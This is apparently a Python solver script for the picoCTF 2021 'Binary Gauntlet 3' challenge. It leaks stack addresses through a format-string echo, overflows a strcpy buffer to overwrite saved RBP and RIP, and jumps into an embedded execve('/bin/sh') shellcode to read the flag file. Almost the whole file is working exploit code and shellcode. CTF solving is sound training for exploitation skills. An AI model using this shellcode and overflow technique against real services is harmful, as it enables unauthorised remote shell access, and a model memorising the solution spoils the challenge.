#!/usr/bin/env python3
"""Solver for Challenge 133 Binary Gauntlet 3 (picoCTF 2021, Binary Exploitation).

Same strcpy overflow as 126 (offset 112 RBP / 120 RIP) but NO %p banner leak.
Stage the leak via the line-1 printf format-string echo (flushed, visible),
then overflow in the SAME connection (one-shot service).

Key findings (verified live):
- Stack is RW (executable) despite description; shellcode-on-stack works.
- strcpy truncates at first NUL: code/heap/GOT addrs (<2^32) die at byte 4.
  Stack addrs (0x7ffd...) survive (NULs only trailing). => RIP/RBP = stack addrs.
- fmt leak positions (stable across instances): pos6/pos12/pos20/pos25/pos31
  hold stack addrs near buf; buf == lowest of the tight cluster (pos12/pos20).
  We take buf = min(cluster) and sled-cover +/-0x40 with a NOP sled so small
  mis-identification still lands in shellcode.
- leave/ret sequence consumes 8 bytes: layout line2 =
    [8B junk][8B RIP_TARGET=buf+16][16B... shellcode at buf+16][pad][RBP=buf][RIP=buf]
  leave -> rsp=buf; pop rbp (junk); ret -> RIP=[buf+8]=buf+16 -> shellcode.

Null-free execve("/bin/sh") 27B (also newline-free for fgets).

Usage: solve_133_binary_gauntlet_3.py [host] [port]
"""
import re
import socket
import struct
import sys
import time

SHELLCODE = bytes([
    0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff,
    0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0,
    0x3b, 0x0f, 0x05,
])
NOP = 0x90
FLAG_RE = re.compile(rb"(academy\{[^}]*\}|picoCTF\{[^}]*\}|flag\{[^}]*\})")


def recv_all(s, timeout=8, maxlen=131072):
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            out += c
            if len(out) > maxlen:
                break
    except socket.timeout:
        pass
    return out


def solve(host, port, timeout=15):
    s = socket.create_connection((host, int(port)), timeout=timeout)
    try:
        recv_all(s, timeout=5)
        s.sendall(("START." + "%p." * 40 + "\n").encode())
        echo = recv_all(s, timeout=5)
        vals = re.findall(rb"0x[0-9a-fA-F]+", echo)
        stacks = sorted(int(v[2:], 16) for v in vals
                        if v.startswith(b"0x7ffd") or v.startswith(b"0x7ffe"))
        print(f"[*] stack addrs: {[hex(x) for x in stacks]}")
        # buf = the tight low cluster (buf, buf+8-ish); take min of values
        # within 0x100 of the minimum
        lo = min(stacks)
        cluster = [x for x in stacks if x - lo <= 0x100]
        buf = min(cluster)
        print(f"[*] buf guess: {hex(buf)}")
        sled = bytes([NOP]) * 16
        sc = sled + SHELLCODE
        # line2 layout: [8 junk][8 RIP_TGT=buf+16][shellcode at buf+16 ...]
        body = b"J" * 8 + struct.pack("<Q", buf + 16) + sc
        body = body.ljust(112, b"K")
        line2 = body + struct.pack("<Q", buf) + struct.pack("<Q", buf)
        assert b"\x00" not in line2 and b"\n" not in line2, "bad bytes!"
        s.sendall(line2 + b"\n")
        time.sleep(1)
        s.sendall(b"cat flag.txt\n")
        out = recv_all(s, timeout=timeout)
        print(out.decode(errors="replace")[:2000])
        m = FLAG_RE.search(out)
        if m:
            return m.group(0).decode()
        return out.decode(errors="replace")
    finally:
        s.close()


if __name__ == "__main__":
    print(solve(sys.argv[1], int(sys.argv[2])))
